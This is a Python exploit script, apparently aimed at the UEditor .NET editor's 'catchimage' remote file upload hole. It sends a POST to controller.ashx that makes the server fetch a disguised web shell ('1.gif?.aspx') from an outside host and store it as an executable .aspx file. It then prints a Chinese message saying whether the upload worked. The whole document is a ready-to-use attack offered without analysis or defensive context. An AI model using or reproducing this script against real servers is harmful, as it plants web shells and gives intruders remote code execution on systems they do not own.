import requests
import re

def upload():
    url = 'http://www.test.com/ueditor/controller.ashx' # www.test.com/xxx/xxx/controller.ashx
    photo_shell = 'http://www.test.com/1.gif' #photo_shell
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1'
        }
    req = requests.post(url=url+'?action=catchimage',headers=headers,data='source[]='+photo_shell+'?.aspx',verify=False)
    
    if re.search('SUCCESS',req.text):
        print('[+] 上传成功！ 请查看响应包内容！')
    else:
        print('[-] 上传失败！ 请查看响应包内容！')
    print(req.text)

if __name__ == '__main__':
    upload()
